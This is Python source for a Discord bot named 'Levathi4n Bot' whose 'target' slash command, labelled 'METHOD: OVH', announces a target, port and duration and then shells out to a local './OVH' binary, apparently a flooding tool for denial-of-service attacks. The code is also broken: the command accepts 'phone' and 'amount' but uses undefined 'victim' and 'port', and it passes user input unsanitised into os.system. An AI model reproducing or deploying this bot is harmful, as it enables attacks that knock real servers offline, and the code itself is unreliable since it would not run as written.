import discord,time
import random
import os, sys, requests, json
from requests import post,Session
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
from discord.utils import get
from random import choice, randint, shuffle
token = "TOKEN BOT HERE"
prefix = "!"
intents = discord.Intents.all()
intents.messages = True
bot = commands.Bot(command_prefix=prefix,help_command=None, intents=discord.Intents.all())

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f'{bot.user} has connected to Discord!')  
 
@bot.event
async def on_connect():
	os.system("clear")
	print(f"Connecting Bot User : {bot.user}")
	time.sleep(1.0)
	print("Bot Is Online Now !!!")
   
@bot.event
async def on_command_error(ctx, error):
	if isinstance(error, commands.CommandOnCooldown):
		messg = discord.Embed(title="**WARNING !!!**",description="`MEMEX`".format(error.retry_after))
		await ctx.reply(embed=messg)
   

@bot.tree.command(name="target", description="METHOD: OVH")
async def target(interaction: discord.Interaction, phone:str, amount: str):	
	embed = discord.Embed(title="Levathi4n Bot", color=discord.Colour.random())
	thna3 = ["https://th.bing.com/th/id/OIP.UAiv5cS9g6uVA1UvTaaCwAHaHa?pid=ImgDet&rs=1"]
	rdthn3 = random.choice(thna3)
	embed.set_thumbnail(url=rdthn3)
	embed.add_field(name="**`User:`**",value=f"[ {interaction.user} ]")
	embed.add_field(name="**`Target:`**",value=f"[ {victim} ]")
	embed.add_field(name="**`Port:`**",value=f"[ {port} ]")
	embed.add_field(name="**`Time:`**",value=f"[ {time} ]")
	embed.add_field(name="**`Methods:`**",value=f"[ OVH ]")
	ima = ["https://media4.giphy.com/media/q217GUnfKAmJlFcjBX/giphy.gif","https://media2.giphy.com/media/dyjrpqaUVqCELGuQVr/giphy.gif"]
	mg = random.choice(ima)
	embed.set_image(url=mg)
	embed.set_footer(text=f" Dev : Levathi4n | Requests By {interaction.user}  ")
	
	await interaction.response.send_message(embed=embed)
	
	os.system(f"./OVH {victim} {port} {time}")
			
bot.run(token)
